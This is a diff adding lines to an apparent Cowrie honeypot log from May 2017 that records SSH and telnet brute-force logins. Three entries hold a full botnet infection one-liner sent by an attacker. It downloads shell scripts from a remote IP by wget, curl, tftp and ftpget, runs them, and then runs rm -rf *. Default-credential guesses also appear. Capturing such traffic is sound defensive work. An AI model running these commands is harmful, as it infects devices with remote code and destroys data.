@@ -7368,3 +7368,51 @@
 2017-05-10T03:47:49+0000 [HoneyPotSSHTransport,77823,130.206.99.99] connection lost
 2017-05-10T03:47:49+0000 [HoneyPotSSHTransport,77823,130.206.99.99] Connection lost after 3 seconds
 2017-05-10T03:47:58+0000 [CowrieTelnetTransport,54581,94.177.199.19] Connection lost after 57 seconds
+2017-05-10T03:48:07+0000 [CowrieTelnetTransport,54582,94.177.199.19] Connection lost after 58 seconds
+2017-05-10T03:48:23+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 130.206.99.99:37421 (10.8.41.81:2222) [session: 9eff15cb]
+2017-05-10T03:48:23+0000 [HoneyPotSSHTransport,77824,130.206.99.99] Remote SSH version: SSH-2.0-libssh-0.2
+2017-05-10T03:48:23+0000 [HoneyPotSSHTransport,77824,130.206.99.99] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-rsa'
+2017-05-10T03:48:23+0000 [HoneyPotSSHTransport,77824,130.206.99.99] outgoing: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-10T03:48:23+0000 [HoneyPotSSHTransport,77824,130.206.99.99] incoming: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-10T03:48:23+0000 [HoneyPotSSHTransport,77824,130.206.99.99] NEW KEYS
+2017-05-10T03:48:23+0000 [HoneyPotSSHTransport,77824,130.206.99.99] starting service 'ssh-userauth'
+2017-05-10T03:48:23+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77824,130.206.99.99] 'dev' trying auth 'password'
+2017-05-10T03:48:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77824,130.206.99.99] login attempt: 8305
+2017-05-10T03:48:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77824,130.206.99.99] login return, expect: [aa/123456]
+2017-05-10T03:48:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,77824,130.206.99.99] login attempt [dev/1234] failed
+2017-05-10T03:48:25+0000 [-] 'dev' failed auth 'password'
+2017-05-10T03:48:25+0000 [-] unauthorized login: 
+2017-05-10T03:48:25+0000 [HoneyPotSSHTransport,77824,130.206.99.99] Got remote error, code 11
+	reason: Bye Bye
+2017-05-10T03:48:25+0000 [HoneyPotSSHTransport,77824,130.206.99.99] connection lost
+2017-05-10T03:48:25+0000 [HoneyPotSSHTransport,77824,130.206.99.99] Connection lost after 2 seconds
+2017-05-10T03:48:28+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 46.119.4.249:41948 (10.8.41.81:2223) [session: TT54583]
+2017-05-10T03:48:34+0000 [CowrieTelnetTransport,54583,46.119.4.249] Connection lost after 5 seconds
+2017-05-10T03:48:40+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 82.118.242.174:50230 (10.8.41.81:2223) [session: TT54584]
+2017-05-10T03:48:40+0000 [CowrieTelnetTransport,54584,82.118.242.174] login attempt: 1115
+2017-05-10T03:48:40+0000 [CowrieTelnetTransport,54584,82.118.242.174] login return, expect: [admin/meinsm]
+2017-05-10T03:48:41+0000 [CowrieTelnetTransport,54584,82.118.242.174] login attempt [admin/] failed
+2017-05-10T03:48:41+0000 [CowrieTelnetTransport,54584,82.118.242.174] Warning: state changed and new state returned
+2017-05-10T03:48:42+0000 [CowrieTelnetTransport,54584,82.118.242.174] login attempt: 1116
+2017-05-10T03:48:42+0000 [CowrieTelnetTransport,54584,82.118.242.174] login return, expect: [admin/meinsm]
+2017-05-10T03:48:43+0000 [CowrieTelnetTransport,54584,82.118.242.174] login attempt [sh/cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.118.242.175/bins.sh; curl -O http://82.118.242.175/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 82.118.242.175 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 82.118.242.175; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 82.118.242.175 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *] failed
+2017-05-10T03:48:43+0000 [CowrieTelnetTransport,54584,82.118.242.174] Warning: state changed and new state returned
+2017-05-10T03:48:52+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 82.118.242.174:52548 (10.8.41.81:2223) [session: TT54585]
+2017-05-10T03:48:52+0000 [CowrieTelnetTransport,54585,82.118.242.174] login attempt: 1117
+2017-05-10T03:48:52+0000 [CowrieTelnetTransport,54585,82.118.242.174] login return, expect: [admin/meinsm]
+2017-05-10T03:48:53+0000 [CowrieTelnetTransport,54585,82.118.242.174] login attempt [root/54321] failed
+2017-05-10T03:48:53+0000 [CowrieTelnetTransport,54585,82.118.242.174] Warning: state changed and new state returned
+2017-05-10T03:48:54+0000 [CowrieTelnetTransport,54585,82.118.242.174] login attempt: 1118
+2017-05-10T03:48:54+0000 [CowrieTelnetTransport,54585,82.118.242.174] login return, expect: [admin/meinsm]
+2017-05-10T03:48:55+0000 [CowrieTelnetTransport,54585,82.118.242.174] login attempt [sh/cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.118.242.175/bins.sh; curl -O http://82.118.242.175/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 82.118.242.175 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 82.118.242.175; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 82.118.242.175 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *] failed
+2017-05-10T03:48:55+0000 [CowrieTelnetTransport,54585,82.118.242.174] Warning: state changed and new state returned
+2017-05-10T03:48:55+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 82.118.242.174:53124 (10.8.41.81:2223) [session: TT54586]
+2017-05-10T03:48:56+0000 [CowrieTelnetTransport,54586,82.118.242.174] login attempt: 1119
+2017-05-10T03:48:56+0000 [CowrieTelnetTransport,54586,82.118.242.174] login return, expect: [admin/meinsm]
+2017-05-10T03:48:56+0000 [CowrieTelnetTransport,54586,82.118.242.174] login attempt [admin/5up ] failed
+2017-05-10T03:48:56+0000 [CowrieTelnetTransport,54586,82.118.242.174] Warning: state changed and new state returned
+2017-05-10T03:48:57+0000 [CowrieTelnetTransport,54584,82.118.242.174] Connection lost after 17 seconds
+2017-05-10T03:48:58+0000 [CowrieTelnetTransport,54586,82.118.242.174] login attempt: 1120
+2017-05-10T03:48:58+0000 [CowrieTelnetTransport,54586,82.118.242.174] login return, expect: [admin/meinsm]
+2017-05-10T03:48:58+0000 [CowrieTelnetTransport,54586,82.118.242.174] login attempt [sh/cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.118.242.175/bins.sh; curl -O http://82.118.242.175/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 82.118.242.175 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 82.118.242.175; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 82.118.242.175 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *] failed
+2017-05-10T03:48:58+0000 [CowrieTelnetTransport,54586,82.118.242.174] Warning: state changed and new state returned
